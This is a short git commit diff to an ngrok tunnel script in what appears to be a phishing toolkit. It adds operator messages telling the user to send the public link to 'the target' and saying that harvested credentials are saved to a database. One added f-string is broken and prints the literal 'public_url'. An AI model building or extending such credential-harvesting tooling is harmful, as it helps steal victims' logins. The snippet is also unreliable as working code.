ef57c219b7724ad814446cf99e021be73da07dd1
leonTech254 <martinleontech23@gmail.com>
2023-10-07 15:50:23 +0300

    --restore auth file

--- ng/ngrok.py
+++ ng/ngrok.py
@@ -3,6 +3,7 @@ import sys
 import os
 import time
 import argparse
+from Asessts.assets import io,colors
 parser= argparse.ArgumentParser()
 parser.add_argument('-p', '--port', type=int, required=True, help='Port number')  
 parser.add_argument('-a', '--auth', type=str, required=True, help='Auth token')
@@ -21,7 +22,10 @@ config = ngrok.get_default_config(ngrok_version='v3')
 config['ngrok_path'] = ngrok_path
 
 public_url = ngrok.connect(port)
-print(f"Ngrok Tunnel is live at: {public_url}")
+io.output(info=f"[!] url: public_url",color=colors.green)
+io.output(info="All set successfully send the link to the target",color=colors.red)
+io.output(info="The credentials will be save in the database click\n 1.to open the database")
+
 
 try:
   print("Running code...")
